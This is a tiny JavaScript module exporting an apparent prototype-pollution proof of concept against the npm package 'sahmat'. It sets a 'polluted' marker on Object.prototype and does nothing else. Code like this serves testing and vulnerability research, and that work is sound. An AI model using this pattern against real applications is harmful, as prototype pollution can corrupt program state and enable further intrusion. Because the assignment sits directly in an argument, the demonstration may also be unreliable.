function exploitFunction(payload) {
    const { obj } = payload;
    const sahmat = require("sahmat"); // Ensure sahmat is required here
    sahmat(obj, "tmp", (obj.__proto__.polluted = "yes"));
}

module.exports = { exploitFunction };